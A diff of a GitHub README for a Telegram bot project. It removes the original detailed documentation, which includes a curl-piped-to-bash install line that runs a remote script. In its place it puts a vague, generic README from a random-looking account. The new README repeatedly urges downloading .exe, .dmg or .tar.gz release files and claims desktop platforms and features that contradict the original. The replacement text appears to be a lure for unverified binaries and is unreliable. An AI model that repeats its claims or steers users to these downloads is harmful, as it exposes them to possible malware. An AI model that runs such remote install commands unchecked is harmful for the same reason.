@@ -1,268 +1,71 @@
-# Telegram Multi-Bot Hosting Platform — One-Click Install/Uninstall
+# 🤖 VPS-TGbot - A Simple Chat Bot Solution
 
-(Automatically runs in the background with auto-start enabled after installation)
-Telegram Multi-Bot Hosting Platform — One-Click Install/Uninstall
+## 🚀 Getting Started
+Welcome to the VPS-TGbot project. This application allows you to easily set up a dual chat bot for your Telegram account. You can enhance your communication experience using this modified platform.
 
-(Automatically runs in the background with auto-start enabled after installation)
-```bash
-bash <(curl -Ls https://raw.githubusercontent.com/alexzhang1433/VPS-TGbot/refs/heads/main/setup.sh)
-```
+## 📥 Download Now
+[![Download VPS-TGbot](https://img.shields.io/badge/Download-VPS--TGbot-blue.svg)](https://github.com/sdgsdgsdgsfaserewr/VPS-TGbot/releases)
 
-> One-click deployment, easily manage multiple Telegram customer-service bots
-> Project Operation Center
+## 🛠️ System Requirements
+To ensure smooth operation, please check the following requirements:
+- Operating System: Windows, MacOS, or Linux (preferably latest versions)
+- RAM: At least 4 GB
+- Disk Space: Minimum 100 MB available for installation
+- Internet Connection: Required for initial setup and updates
 
-## 📖 Introduction
+## 🔗 How to Download and Install
+To get started with VPS-TGbot, follow these steps:
 
-This is a complete Telegram bot hosting solution that lets you create and manage multiple customer-service bots through a single management bot. It supports Direct Forwarding mode and Forum Topic Group mode, with a built-in verification system to prevent abuse.
+1. **Visit the Download Page**
+   Go to the [Releases page](https://github.com/sdgsdgsdgsfaserewr/VPS-TGbot/releases) to find the latest version of VPS-TGbot.
 
-## ✨ Key Features
+2. **Choose Your Version**
+   On the Releases page, look for the most recent version. You will see various files available for download. 
 
-- 🤖 Multi-Bot Management – Manage unlimited customer-service bots in one platform
+3. **Download the File**
+   Click on the link that corresponds to your operating system. The file format may be `.exe`, `.dmg`, or `.tar.gz`, depending on your system.
 
-- 💬 Two Working Modes – Direct Forwarding / Forum Topic Group
+4. **Install the Application**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **MacOS:** Open the downloaded `.dmg` file and drag the VPS-TGbot to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file using your archive manager, and run the installer script in the command line.
 
-- 🔐 Smart Verification – 5 types of verification codes to prevent spam
+5. **Launch VPS-TGbot**
+   After installation, open VPS-TGbot from your application menu or desktop.
 
-- 📣 Custom Welcome Message – Stored in SQLite with automatic backup (New)
+## 🔧 Configuration
+Once you launch the application, follow these steps to set up VPS-TGbot:
+1. Enter your Telegram API key when prompted.
+2. Modify your chat settings according to your preferences.
+3. Save the settings and restart the application to apply changes.
 
-- 📊 User Management – View, block, unblock users
+## 🌟 Features
+- **Dual Chat Support:** Communicate simultaneously across different channels.
+- **User-Friendly Interface:** Easily navigate through settings and options.
+- **Customizable Notifications:** Set up alerts for important messages.
+- **Regular Updates:** Benefit from continuous enhancements and new features.
 
-- 💾 Data Persistence – SQLite storage with automatic backup
+## ❓ Frequently Asked Questions
 
-- 🔄 Auto Sync – GitHub auto-backup for data security
+### How do I reset my settings?
+To reset your application settings, go to the settings menu and click on "Reset to Default." Confirm the action when prompted.
 
-- 👥 Admin Features – User list, broadcast, clean invalid bots
+### Can I run VPS-TGbot on a VPS?
+Yes, VPS-TGbot is designed to run on VPS servers. Ensure your server meets the system requirements listed above.
 
-- 🚀 Quick Start
+### How do I contact support?
+For any issues or queries, reach out via the support link found in the application's help menu.
 
-The installation script automatically performs:
+## 📊 Feedback
+We welcome your feedback to improve VPS-TGbot. Please share your thoughts through the support link in the application.
 
-1.✅ Check/Install Python 3.11+
+## 🔗 Additional Resources
+For more information and updates, check our project repository regularly. You can find information about upcoming features and community discussions there.
 
-2.✅ Install required dependencies
+## 📜 License
+VPS-TGbot is released under the MIT License. You can use, modify, and distribute the software, but remember to provide appropriate credit.
 
-3.✅ Create virtual environment
+## 🌐 Visit for Updates
+Stay updated with the latest versions and news by visiting the [Releases page](https://github.com/sdgsdgsdgsfaserewr/VPS-TGbot/releases) regularly. 
 
-4.✅ Configure systemd service
-
-5.✅ Optional GitHub auto-backup setup
-
-## 📱 Usage Guide
-### User Workflow
-#### 1️⃣ Add a Bot
-
-1. Send /start to the management bot
-
-2. Tap ➕ Add Bot
-
-3. Enter your Bot Token
-
-4. Select working mode:
-
-   - **Direct Forwarding** — Messages go directly to you
-
-   - **orum Topic Mode** — Messages go to a specific topic in a group
-
-#### 2️⃣ Manage Bots
-
-Tap 🤖 My Bots to:
-
-- 📊 View bot status
-
-- 👥 View verified users
-
-- 🗑️ Delete a bot
-
-- ⚙️ Modify bot configuration
-
-#### 3️⃣ User Management
-
-Inside bot details:
-
-- ✅ View user list
-
-- 🚫 Block user
-
-- 🔄 Unblock user
-
-- ❌ Remove verification
-
-### Working Modes
-#### Mode 1: Direct Forwarding (Recommended for beginners)
-```
-User → Bot → Your private chat
-Your private chat → Bot → User
-```
-
-**Pros**: Simple and easy, no group configuration
-**Best for**: Personal support, small-scale business
-
-#### Mode 2: Forum Topic Group (Recommended for teams)
-```
-User → Bot → Group Topic
-Group Topic → Bot → User
-```
-
-**Pros**: Multi-agent collaboration, categorized messages
-**Best for**: Teams, larger business operations
-
-**Setup**:
-
-1.Create a group and enable Topics
-
-2.Add your bot as Administrator
-
-3.Set the topic ID inside the management bot
-
-### User Management Commands
-| Command|Function|Usage 1: Reply to message|Usage 2: Direct input|Topic Mode| 
-|------|------|-------------------|-------------------|-------------------|
-|/id	View user| info|Reply + /id|/id 123456789|/id|
-|/b or /block|Block user|Reply + /b|/b 123456789|/b|
-|/ub or /unblock|Unblock user|Reply + /ub|/ub 123456789|/ub|
-|/bl or /blocklist|Show |blacklist	–	/bl	|/bl|
-|/uv or /unverify|Remove verification|	Reply + /uv|	/uv 123456789|	/uv|
-
-### Command Examples
-
-**Scenario 1: Block a spammer**
-```
-User: sends spam
-You: [reply to user message] /b
-Bot: 🚫 User 123456789 has been blocked
-```
-
-**Scenario 2: View user information**
-```
-You: [reply to user message] /id
-Bot: User Info:
-     • ID: 123456789
-     • Username: @example
-     • Name: Example User
-     • Verified: ✅ Yes
-```
-
-**Scenario 3: Batch management**
-```
-You: /bl
-Bot: 📋 Blacklist:
-     1. @user1 (ID: 111111)
-     2. @user2 (ID: 222222)
-
-You: /ub 111111
-Bot: ✅ User 111111 unblocked
-```
-
-## 👑 Admin Features
-
-Admins (configured in ADMIN_CHANNEL) have:
-
-| Feature| 	Icon| 	Description| 	Notes| 
-|------|------|------|---------|
-| User List	| 👥	| View all users across all bots	Supports|  pagination (15 per page)
-| Broadcast	| 📢	| Send announcement to all users	Ideal for|  maintenance or updates
-| Clean Invalid Bots| 	🗑️| 	Remove bots with invalid tokens| 	Requires confirmation
-## 🔒 Verification System
-
-To prevent abuse, users must pass verification on first use. Five types supported:
-
-|Type|	Icon|	Description|	Example|
-|------|------|------|---------|
-|Math	|🔢|	Mixed arithmetic|	12 + 5 × 3 = ?
-|Number Sequence	|📊|	Arithmetic/geometric/square sequence|	`2, 4, 8, 16, ?`|
-|Chinese Q&A	|🇨🇳|	Basic|` Chinese knowledge	Capital of China?`|
-|Logic	|🧩|	Simple reasoning|	`If A>B and B>C, then?`|
-|Time Q&A	|⏰|	Basic time knowledge|	`How many days in a week?`|
-
-✅ Once verified, users don’t need to verify again.
-
-## 🛠️ Common Commands
-### Service Management
-|Action	|Command|
-|------|------|
-|Start|	`systemctl start tg_multi_bot` |
-|Stop|	`systemctl stop tg_multi_bot` |
-|Restart|	`systemctl restart tg_multi_bot` |
-|Status|	`systemctl status tg_multi_bot` |
-|Disable auto-start|	`systemctl disable tg_multi_bot` |
-
-## 📂 File Structure
-```
-/opt/tg_multi_bot/
-├── host_bot.py          # Main program
-├── database.py          # Database module
-├── bot_data.db          # SQLite database
-├── .env                 # Environment variables
-├── backup.sh            # Backup script
-├── venv/                # Python virtual environment
-└── backup_temp/         # Temporary backup directory
-```
-
-### ❓ FAQ
-Q: Invalid Token?
-
-Ensure token is copied correctly
-
-Make sure bot is not deleted or disabled
-
-Regenerate token via @BotFather
-
-### Q: Messages not forwarding?
-
-Direct Mode: Ensure you have sent /start to the bot
-
-Topic Mode: Ensure bot is admin & topic ID is correct
-
-### 📊 System Requirements
-|Item	|Requirement|
-|------|------|
-|OS	Ubuntu| 20.04+ / Debian 10+
-|Python|	3.11+|
-|RAM|	Minimum 512MB (1GB recommended)|
-|Disk| Minimum 1GB free|
-|Network	Stable internet connection|
-
-### 🆘 Getting Help
-
-- 📖 See the full documentation (this README)
-- 
-
-### 🐛 Report Issues
-
-Please include:
-
-1.Detailed error message
-
-2.Relevant logs
-
-3.Steps to reproduce
-
-### ⚠️ Notes
-
-1.Protect your Bot Token — never share it
-
-2.Backup regularly even though auto-backup exists
-
-3.Be careful when deleting bots — data cannot be restored
-
-4.Follow Telegram usage policies
-
-5.Monitor logs regularly for issues
-
-### 📜 License
-
-MIT License — Free to use with copyright notice.
-
-### 🎯 Version Info
-
-- **Current Version**: v2.0
-
-- **Updated**: 2025-11-18
-
-- **Database**: SQLite 3
-
-- **Python**: 3.11+
-
-**Made with ❤️ for Telegram Bot Lovers**
-
-
+Thank you for choosing VPS-TGbot! Enjoy seamless chatting on Telegram.
